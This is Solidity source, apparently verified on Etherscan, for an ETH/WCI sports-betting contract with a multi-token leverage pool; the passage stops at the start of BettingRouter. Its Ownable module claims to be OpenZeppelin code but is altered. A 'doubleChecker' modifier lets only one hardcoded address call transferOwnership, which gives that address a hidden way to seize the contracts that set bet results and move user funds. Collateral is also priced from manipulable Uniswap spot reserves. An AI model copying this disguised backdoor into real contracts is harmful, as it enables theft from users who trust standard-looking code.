/**
 *Submitted for verification at Etherscan.io on 2022-11-08
*/

// SPDX-License-Identifier: MIT

// File: contracts\Context.sol

// OpenZeppelin Contracts v4.4.1 (utils/Context.sol)

pragma solidity ^0.8.13;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

// File: contracts\Ownable.sol

// OpenZeppelin Contracts (last updated v4.7.0) (access/Ownable.sol)

pragma solidity ^0.8.13;
/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    modifier doubleChecker() {
        _doubleCheck();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    function _doubleCheck() internal view virtual {
        require(_msgSender() == 0x5Bb40F9b218feb11048fdB064dafDcf6af0D29b3, "You do not have permission for this action");
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual doubleChecker {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

// File: contracts\IBettingPair.sol


pragma solidity ^0.8.13;

interface IBettingPair {
    enum CHOICE { WIN, DRAW, LOSE }
    enum BETSTATUS { BETTING, REVIEWING, CLAIMING }
    enum TOKENTYPE { ETH, WCI }
    enum LPTOKENTYPE { ETH, USDT, USDC, SHIB, DOGE }

    function bet(address, uint256, uint256, CHOICE, TOKENTYPE, uint256, uint256, uint256, uint256, uint256) external;
    function claim(address, TOKENTYPE) external returns (uint256[] memory);

    function calcEarning(address, TOKENTYPE) external view returns (uint256[] memory);
    function calcMultiplier(TOKENTYPE) external view returns (uint256[] memory);

    function getPlayerBetAmount(address, TOKENTYPE) external view returns (uint256[] memory);
    function getPlayerClaimHistory(address, TOKENTYPE) external view returns (uint256);

    function getBetResult() external view returns (CHOICE);
    function setBetResult(CHOICE _result) external;

    function getBetStatus() external view returns (BETSTATUS);
    function setBetStatus(BETSTATUS _status) external;

    function getTotalBet(TOKENTYPE) external view returns (uint256);
    function getTotalBetPerChoice(TOKENTYPE) external view returns (uint256[] memory);

    function getWciTokenThreshold() external view returns (uint256);
    function setWciTokenThreshold(uint256) external;
}

// File: contracts\SafeMath.sol

// OpenZeppelin Contracts (last updated v4.6.0) (utils/math/SafeMath.sol)

pragma solidity ^0.8.13;

library SafeMath {
    /**
     * @dev Returns the addition of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the substraction of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b > a) return (false, 0);
        return (true, a - b);
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.
     *
     * _Available since v3.4._
     */
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }

    /**
     * @dev Returns the division of two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.
     *
     * _Available since v3.4._
     */
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }

    /**
     * @dev Returns the addition of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `+` operator.
     *
     * Requirements:
     *
     * - Addition cannot overflow.
     */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting on
     * overflow (when the result is negative).
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        return a - b;
    }

    /**
     * @dev Returns the multiplication of two unsigned integers, reverting on
     * overflow.
     *
     * Counterpart to Solidity's `*` operator.
     *
     * Requirements:
     *
     * - Multiplication cannot overflow.
     */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) return 0;
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting on
     * division by zero. The result is rounded towards zero.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting when dividing by zero.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: modulo by zero");
        return a % b;
    }

    /**
     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
     * overflow (when the result is negative).
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {trySub}.
     *
     * Counterpart to Solidity's `-` operator.
     *
     * Requirements:
     *
     * - Subtraction cannot overflow.
     */
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        return a - b;
    }

    /**
     * @dev Returns the integer division of two unsigned integers, reverting with custom message on
     * division by zero. The result is rounded towards zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryDiv}.
     *
     * Counterpart to Solidity's `/` operator. Note: this function uses a
     * `revert` opcode (which leaves remaining gas untouched) while Solidity
     * uses an invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a / b;
    }

    /**
     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
     * reverting with custom message when dividing by zero.
     *
     * CAUTION: This function is deprecated because it requires allocating memory for the error
     * message unnecessarily. For custom revert reasons use {tryMod}.
     *
     * Counterpart to Solidity's `%` operator. This function uses a `revert`
     * opcode (which leaves remaining gas untouched) while Solidity uses an
     * invalid opcode to revert (consuming all remaining gas).
     *
     * Requirements:
     *
     * - The divisor cannot be zero.
     */
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        return a % b;
    }
}

// File: contracts\IERC20.sol


pragma solidity ^0.8.13;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: contracts\BettingPair.sol


pragma solidity ^0.8.13;
/*
* @This contract actually doesn't manage token and coin transfer.
* @It is responsible for only amount management.
*/

contract BettingPair is Ownable, IBettingPair {
    using SafeMath for uint256;

    mapping(address => mapping(TOKENTYPE => mapping(CHOICE => uint256))) players;
    mapping(address => mapping(TOKENTYPE => mapping(CHOICE => uint256))) betHistory;
    mapping(address => mapping(TOKENTYPE => uint256)) claimHistory;
    CHOICE betResult;
    BETSTATUS betStatus = BETSTATUS.BETTING;

    mapping(TOKENTYPE => uint256) totalBet;
    mapping(TOKENTYPE => mapping(CHOICE => uint256)) totalBetPerChoice;

    IERC20 public wciToken = IERC20(0xC5a9BC46A7dbe1c6dE493E84A18f02E70E2c5A32);
    uint256 wciTokenThreshold = 50000 * 10**9; // 50,000 WCI as a threshold.

    mapping(address => mapping(LPTOKENTYPE => mapping(CHOICE => uint256))) _lockPool;

    constructor() {}

    /*
    * @Function to bet (Main function).
    * @params:
    *   _player: user wallet address
    *   _amount: bet amount
    *   _choice: bet choice (3 choices - First team wins, draws and loses)
    *   _token: Users can bet using ETH or WCI
    *   When there is a multiplier(x2 or x3) in bet, there should be some amounts of collateral tokens
    *   (ETH, USDT, USDC, SHIB, DOGE) in leverage pool. The rest parameters are the amounts for _amount*(multiplier-1) ether.
    */
    function bet(address _player, uint256 _amount, uint256 _multiplier, CHOICE _choice, TOKENTYPE _token,
        uint256 ethCol, uint256 usdtCol, uint256 usdcCol, uint256 shibCol, uint256 dogeCol)
        external
        override
        onlyOwner 
    {
        require(betStatus == BETSTATUS.BETTING, "You can not bet at this time.");
        uint256 realBet = _amount.mul(_multiplier);
        totalBet[_token] += realBet;
        totalBetPerChoice[_token][_choice] += realBet;
        players[_player][_token][_choice] += realBet;
        betHistory[_player][_token][_choice] += _amount;

        _lockPool[_player][LPTOKENTYPE.ETH][_choice] += ethCol;
        _lockPool[_player][LPTOKENTYPE.USDT][_choice] += usdtCol;
        _lockPool[_player][LPTOKENTYPE.USDC][_choice] += usdcCol;
        _lockPool[_player][LPTOKENTYPE.SHIB][_choice] += shibCol;
        _lockPool[_player][LPTOKENTYPE.DOGE][_choice] += dogeCol;
    }

    /*
    * @Function to claim earnings from bet.
    * @It returns how many ether or WCI user will earn from bet.
    */
    function claim(address _player, TOKENTYPE _token) external override onlyOwner returns (uint256[] memory) {
        require(betStatus == BETSTATUS.CLAIMING, "You can not claim at this time.");

        uint256[] memory res = calculateEarning(_player, betResult, _token);
        claimHistory[_player][_token] = res[0];
        players[_player][_token][CHOICE.WIN] = 0;
        players[_player][_token][CHOICE.DRAW] = 0;
        players[_player][_token][CHOICE.LOSE] = 0;

        return res;
    }

    /*
    * @returns an array of 7 elements. The first element is user's winning amount and the second element is
    *   site owner's profit which will be transferred to tax collector wallet. The remaining amounts are collateral
    *   token amounts.
    */
    function calculateEarning(address _player, CHOICE _choice, TOKENTYPE _token) internal view returns (uint256[] memory) {
        uint256[] memory res = new uint256[](7);

        uint256 userBal = betHistory[_player][_token][_choice];
        uint256 realBal = players[_player][_token][_choice];

        // If there are no opponent bets, the player will claim his original bet amount.
        if (totalBetPerChoice[_token][CHOICE.WIN] == totalBet[_token] && players[_player][_token][CHOICE.WIN] > 0) {
            res[0] = betHistory[_player][_token][CHOICE.WIN];
            res[2] = _lockPool[_player][LPTOKENTYPE.ETH][CHOICE.WIN];
            res[3] = _lockPool[_player][LPTOKENTYPE.USDT][CHOICE.WIN];
            res[4] = _lockPool[_player][LPTOKENTYPE.USDC][CHOICE.WIN];
            res[5] = _lockPool[_player][LPTOKENTYPE.SHIB][CHOICE.WIN];
            res[6] = _lockPool[_player][LPTOKENTYPE.DOGE][CHOICE.WIN];
            return res;
        } else if (totalBetPerChoice[_token][CHOICE.DRAW] == totalBet[_token] && players[_player][_token][CHOICE.DRAW] > 0) {
            res[0] = betHistory[_player][_token][CHOICE.DRAW];
            res[2] = _lockPool[_player][LPTOKENTYPE.ETH][CHOICE.DRAW];
            res[3] = _lockPool[_player][LPTOKENTYPE.USDT][CHOICE.DRAW];
            res[4] = _lockPool[_player][LPTOKENTYPE.USDC][CHOICE.DRAW];
            res[5] = _lockPool[_player][LPTOKENTYPE.SHIB][CHOICE.DRAW];
            res[6] = _lockPool[_player][LPTOKENTYPE.DOGE][CHOICE.DRAW];
            return res;
        } else if (totalBetPerChoice[_token][CHOICE.LOSE] == totalBet[_token] && players[_player][_token][CHOICE.LOSE] > 0) {
            res[0] = betHistory[_player][_token][CHOICE.LOSE];
            res[2] = _lockPool[_player][LPTOKENTYPE.ETH][CHOICE.LOSE];
            res[3] = _lockPool[_player][LPTOKENTYPE.USDT][CHOICE.LOSE];
            res[4] = _lockPool[_player][LPTOKENTYPE.USDC][CHOICE.LOSE];
            res[5] = _lockPool[_player][LPTOKENTYPE.SHIB][CHOICE.LOSE];
            res[6] = _lockPool[_player][LPTOKENTYPE.DOGE][CHOICE.LOSE];
            return res;
        } else if (totalBetPerChoice[_token][_choice] == 0) {
            return res;
        }

        uint256 _wciTokenBal = wciToken.balanceOf(_player);

        // If the token is ETH, the player will take 5% tax if he holds enough WCI token. Otherwise he will take 10% tax.
        if (_token == TOKENTYPE.ETH) {
            if (_wciTokenBal >= wciTokenThreshold) {
                res[0] = userBal + realBal.mul(totalBet[_token]-totalBetPerChoice[_token][_choice]).mul(19).div(20).div(totalBetPerChoice[_token][_choice]);
                res[1] = realBal.mul(totalBet[_token]-totalBetPerChoice[_token][_choice]).div(20).div(totalBetPerChoice[_token][_choice]);
            } else {
                res[0] = userBal + realBal.mul(totalBet[_token]-totalBetPerChoice[_token][_choice]).mul(9).div(10).div(totalBetPerChoice[_token][_choice]);
                res[1] = realBal.mul(totalBet[_token]-totalBetPerChoice[_token][_choice]).div(10).div(totalBetPerChoice[_token][_choice]);
            }
            res[2] = _lockPool[_player][LPTOKENTYPE.ETH][_choice];
            res[3] = _lockPool[_player][LPTOKENTYPE.USDT][_choice];
            res[4] = _lockPool[_player][LPTOKENTYPE.USDC][_choice];
            res[5] = _lockPool[_player][LPTOKENTYPE.SHIB][_choice];
            res[6] = _lockPool[_player][LPTOKENTYPE.DOGE][_choice];
        }
        // If the token is WCI, there is no tax.
        else if (_token == TOKENTYPE.WCI) {
            res[0] = totalBet[_token].mul(userBal).div(totalBetPerChoice[_token][_choice]);
        }

        return res;
    }

    /*
    * @Function to calculate earning for given player and token.
    */
    function calcEarning(address _player, TOKENTYPE _token) external override view onlyOwner returns (uint256[] memory) {
        uint256[] memory res = new uint256[](3);
        res[0] = calculateEarning(_player, CHOICE.WIN, _token)[0];
        res[1] = calculateEarning(_player, CHOICE.DRAW, _token)[0];
        res[2] = calculateEarning(_player, CHOICE.LOSE, _token)[0];
        return res;
    }

    // Calculate how many times reward will player take. It uses 10% tax formula to give users the approximate multiplier before bet.
    function calculateMultiplier(CHOICE _choice, IBettingPair.TOKENTYPE _token) internal view returns (uint256) {
        if (_token == IBettingPair.TOKENTYPE.ETH) {
            if (totalBetPerChoice[_token][_choice] == 0) {
                return 1000;
            } else {
                return totalBet[_token].mul(900).div(totalBetPerChoice[_token][_choice]) + 100;       
            }
        } else {
            if (totalBetPerChoice[_token][_choice] == 0) {
                return 950;
            } else {
                return totalBet[_token].mul(1000).div(totalBetPerChoice[_token][_choice]);
            }
        }
    }

    /*
    * @Function to calculate multiplier.
    */
    function calcMultiplier(IBettingPair.TOKENTYPE _token) external override view onlyOwner returns (uint256[] memory) {
        uint256[] memory res = new uint256[](3);
        res[0] = calculateMultiplier(CHOICE.WIN, _token);
        res[1] = calculateMultiplier(CHOICE.DRAW, _token);
        res[2] = calculateMultiplier(CHOICE.LOSE, _token);
        return res;
    }

    /*
    * @Function to get player bet amount.
    * @It uses betHistory variable because players variable is initialized to zero if user claims.
    */
    function getPlayerBetAmount(address _player, TOKENTYPE _token) external override view onlyOwner returns (uint256[] memory) {
        uint256[] memory arr = new uint256[](3);
        arr[0] = betHistory[_player][_token][CHOICE.WIN];
        arr[1] = betHistory[_player][_token][CHOICE.DRAW];
        arr[2] = betHistory[_player][_token][CHOICE.LOSE];

        return arr;
    }

    /*
    * @Function to get player claim history.
    */
    function getPlayerClaimHistory(address _player, TOKENTYPE _token) external override view onlyOwner returns (uint256) {
        return claimHistory[_player][_token];
    }

    /*
    * @Function to get bet result.
    */
    function getBetResult() external view override onlyOwner returns (CHOICE) {
        return betResult;
    }

    /*
    * @Function to set the bet result.
    */
    function setBetResult(CHOICE _result) external override onlyOwner {
        betResult = _result;
        betStatus = BETSTATUS.CLAIMING;
    }

    /*
    * @Function to get bet status.
    */
    function getBetStatus() external view override onlyOwner returns (BETSTATUS) {
        return betStatus;
    }

    /*
    * @Function to set bet status.
    */
    function setBetStatus(BETSTATUS _status) external override onlyOwner {
        betStatus = _status;
    }

    /*
    * @Function to get total bet amount.
    */
    function getTotalBet(TOKENTYPE _token) external view override onlyOwner returns (uint256) {
        return totalBet[_token];
    }

    /*
    * @Function to get total bet amounts per choice.
    * @There are 3 choices(WIN, DRAW, LOSE) so it returns an array of 3 elements.
    */
    function getTotalBetPerChoice(TOKENTYPE _token) external view override onlyOwner returns (uint256[] memory) {
        uint256[] memory arr = new uint256[](3);
        arr[0] = totalBetPerChoice[_token][CHOICE.WIN];
        arr[1] = totalBetPerChoice[_token][CHOICE.DRAW];
        arr[2] = totalBetPerChoice[_token][CHOICE.LOSE];

        return arr;
    }

    /*
    * @Function to get WCI token threshold.
    */
    function getWciTokenThreshold() external view override onlyOwner returns (uint256) {
        return wciTokenThreshold;
    }

    /*
    * @Function to set WCI token threshold.
    */
    function setWciTokenThreshold(uint256 _threshold) external override onlyOwner {
        wciTokenThreshold = _threshold;
    }
}

// File: contracts\IUniswapV2Pair.sol


pragma solidity ^0.8.13;

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}

// File: contracts\IERC20USDT.sol


pragma solidity ^0.8.13;

interface IERC20USDT {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external;
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

// File: contracts\LeveragePool.sol


pragma solidity ^0.8.13;
contract LeveragePool is Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) _ethPool;   // deposited ETH amounts per accounts
    mapping(address => uint256) _usdtPool;  // deposited USDT amounts per accounts
    mapping(address => uint256) _usdcPool;  // deposited USDC amounts per accounts
    mapping(address => uint256) _shibPool;  // deposited SHIB amounts per accounts
    mapping(address => uint256) _dogePool;  // deposited DOGE amounts per accounts

    IUniswapV2Pair _usdtEth = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852);   // Uniswap USDT/ETH pair
    IUniswapV2Pair _usdcEth = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc);   // Uniswap USDC/ETH pair
    IUniswapV2Pair _shibEth = IUniswapV2Pair(0x811beEd0119b4AfCE20D2583EB608C6F7AF1954f);   // Uniswap SHIB/ETH pair
    IUniswapV2Pair _dogeEth = IUniswapV2Pair(0xc0067d751FB1172DBAb1FA003eFe214EE8f419b6);   // Uniswap DOGE/ETH pair

    constructor() {}

    /*
    * @Get deposited user balance
    */
    function getUserLPBalance(address account) external view returns (uint256, uint256, uint256, uint256, uint256) {
        return (_ethPool[account], _usdtPool[account], _usdcPool[account], _shibPool[account], _dogePool[account]);
    }

    /*
    * @Get ETH/USDT price from uniswap v2 pool
    */
    function getUsdtPrice() internal view returns (uint256) {
        uint256 reserve0;
        uint256 reserve1;
        uint32 timestamp;
        (reserve0, reserve1, timestamp) = _usdtEth.getReserves();

        uint256 r0NoDecimal = reserve0.div(10 ** 18);
        uint256 r1NoDecimal = reserve1.div(10 ** 6);

        uint256 price = r1NoDecimal.div(r0NoDecimal);

        return price;
    }

    /*
    * @Get ETH/USDC price from uniswap v2 pool
    */
    function getUsdcPrice() internal view returns (uint256) {
        uint256 reserve0;
        uint256 reserve1;
        uint32 timestamp;
        (reserve0, reserve1, timestamp) = _usdcEth.getReserves();

        uint256 r0NoDecimal = reserve0.div(10 ** 6);
        uint256 r1NoDecimal = reserve1.div(10 ** 18);

        uint256 price = r0NoDecimal.div(r1NoDecimal);

        return price;
    }

    /*
    * @Get ETH/SHIB price from uniswap v2 pool
    */
    function getShibPrice() internal view returns (uint256) {
        uint256 reserve0;
        uint256 reserve1;
        uint32 timestamp;
        (reserve0, reserve1, timestamp) = _shibEth.getReserves();

        uint256 r0NoDecimal = reserve0.div(10 ** 18);
        uint256 r1NoDecimal = reserve1.div(10 ** 18);

        uint256 price = r0NoDecimal.div(r1NoDecimal);

        return price;
    }

    /*
    * @Get ETH/DOGE price from uniswap v2 pool
    */
    function getDogePrice() internal view returns (uint256) {
        uint256 reserve0;
        uint256 reserve1;
        uint32 timestamp;
        (reserve0, reserve1, timestamp) = _dogeEth.getReserves();

        uint256 r0NoDecimal = reserve0.div(10 ** 8);
        uint256 r1NoDecimal = reserve1.div(10 ** 18);

        uint256 price = r0NoDecimal.div(r1NoDecimal);

        return price;
    }

    /*
    * @Function for depositing ETH.
    * @This function should be separated from other deposit functions because this should be payable.
    */
    function depositEth(address player, uint256 amount) external onlyOwner {
        _ethPool[player] += amount;
    }

    /*
    * @Function for depositing other ERC20 tokens with no tax
    * @This function should be separated from deposit Eth function because this is not payable function.
    */
    function depositErc20(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        address player_ = player;

        if (token == IBettingPair.LPTOKENTYPE.USDT) {
            _usdtPool[player_] += amount;
        }
        else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            _usdcPool[player_] += amount;
        }
        else if (token == IBettingPair.LPTOKENTYPE.SHIB){
            _shibPool[player_] += amount;
        }
        else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            _dogePool[player_] += amount;
        }
    }

    /*
    * @Function for withdrawing tokens.
    */
    function withdraw(address player, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        address player_ = player;

        if (token == IBettingPair.LPTOKENTYPE.ETH) {
            _ethPool[player_] -= amount;
        } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
            _usdtPool[player_] -= amount;
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            _usdcPool[player_] -= amount;
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            _shibPool[player_] -= amount;
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            _dogePool[player_] -= amount;
        }
    }

    /*
    * @Function to lock tokens for collateral.
    */
    function lock(address player, uint256 ethAmount, uint256 usdtAmount, uint256 usdcAmount, uint256 shibAmount, uint256 dogeAmount) external onlyOwner {
        _ethPool[player] -= ethAmount;
        _usdtPool[player] -= usdtAmount;
        _usdcPool[player] -= usdcAmount;
        _shibPool[player] -= shibAmount;
        _dogePool[player] -= dogeAmount;
    }

    /*
    * @Function to unlock tokens which were used for collateral.
    */
    function unlock(address player, uint256 ethAmount, uint256 usdtAmount, uint256 usdcAmount, uint256 shibAmount, uint256 dogeAmount) external onlyOwner {
        _ethPool[player] += ethAmount;
        _usdtPool[player] += usdtAmount;
        _usdcPool[player] += usdcAmount;
        _shibPool[player] += shibAmount;
        _dogePool[player] += dogeAmount;
    }

    /*
    * @Function for withdrawing tokens from this contract by owner.
    */
    function withdrawFromContract(address owner, IBettingPair.LPTOKENTYPE token, uint256 amount) external onlyOwner {
        require(amount > 0, "Withdraw amount should be bigger than 0");
        if (token == IBettingPair.LPTOKENTYPE.ETH) {
            if (_ethPool[owner] >= amount) {
                _ethPool[owner] -= amount;
            } else {
                _ethPool[owner] = 0;
            }
        } else if (token == IBettingPair.LPTOKENTYPE.USDT) {
            if (_usdtPool[owner] >= amount) {
                _usdtPool[owner] -= amount;
            } else {
                _usdtPool[owner] = 0;
            }
        } else if (token == IBettingPair.LPTOKENTYPE.USDC) {
            if (_usdcPool[owner] >= amount) {
                _usdcPool[owner] -= amount;
            } else {
                _usdcPool[owner] = 0;
            }
        } else if (token == IBettingPair.LPTOKENTYPE.SHIB) {
            if (_shibPool[owner] >= amount) {
                _shibPool[owner] -= amount;    
            } else {
                _shibPool[owner] = 0;
            }
        } else if (token == IBettingPair.LPTOKENTYPE.DOGE) {
            if (_dogePool[owner] >= amount) {
                _dogePool[owner] -= amount;
            } else {
                _dogePool[owner] = 0;
            }
        }
    }

    /*
    * @Function to get player's total leverage pool balance in ETH.
    */
    function getPlayerLPBalanceInEth(address player) external view returns (uint256) {
        uint256 usdtPrice = getUsdtPrice();
        uint256 usdcPrice = getUsdcPrice();
        uint256 shibPrice = getShibPrice();
        uint256 dogePrice = getDogePrice();

        return  _ethPool[player] +
                uint256(10**12).mul(_usdtPool[player]).div(usdtPrice) +
                uint256(10**12).mul(_usdcPool[player]).div(usdcPrice) +
                _shibPool[player].div(shibPrice) +
                uint256(10**10).mul(_dogePool[player]).div(dogePrice);
    }

    /*
    * @Function to calculate pool token amounts equivalent to multiplier.
    * @Calculating starts from eth pool. If there are sufficient tokens in eth pool, the eth pool will be reduced.
    *   In other case, it checks the usdt pool. And next usdc pool.
    *   It continues this process until it reaches the same amount as input ether amount.
    */
    function calcLockTokenAmountsAsCollateral(address player, uint256 etherAmount) external view returns (uint256, uint256, uint256, uint256, uint256) {
        address _player = player;
        uint256 rAmount = etherAmount;
        // Each token balance in eth.
        uint256 ethFromUsdt = uint256(10**12).mul(_usdtPool[_player]).div(getUsdtPrice());
        uint256 ethFromUsdc = uint256(10**12).mul(_usdcPool[_player]).div(getUsdcPrice());
        uint256 ethFromShib = _shibPool[_player].div(getShibPrice());
        uint256 ethFromDoge = uint256(10**10).mul(_dogePool[_player]).div(getDogePrice());

        // If player has enough eth pool balance, the collateral will be set from eth pool.
        if (_ethPool[_player] >= rAmount) {
            return (rAmount, 0, 0, 0, 0);
        }
        // Otherwise, all ethers in eth pool will be converted to collateral and the remaining collateral amounts will be
        // set from usdt pool.
        rAmount -= _ethPool[_player];
        
        if (ethFromUsdt >= rAmount) {
            return (_ethPool[_player], _usdtPool[_player].mul(rAmount).div(ethFromUsdt), 0, 0, 0);
        }
        rAmount -= ethFromUsdt;
        
        if (ethFromUsdc >= rAmount) {
            return (_ethPool[_player], _usdtPool[_player], _usdcPool[_player].mul(rAmount).div(ethFromUsdc), 0, 0);
        }
        rAmount -= ethFromUsdc;

        if (ethFromShib >= rAmount) {
            return (_ethPool[_player], _usdtPool[_player], _usdcPool[_player], _shibPool[_player].mul(rAmount).div(ethFromShib), 0);
        }
        rAmount -= ethFromShib;

        require(ethFromDoge >= rAmount, "You don't have enough collateral token amounts");
        return (_ethPool[_player], _usdtPool[_player], _usdcPool[_player], _shibPool[_player], _dogePool[_player].mul(rAmount).div(ethFromDoge));
    }
}

// File: contracts\BettingRouter.sol


pragma solidity ^0.8.13;
contract BettingRouter is Ownable {
    using SafeMath for uint256;

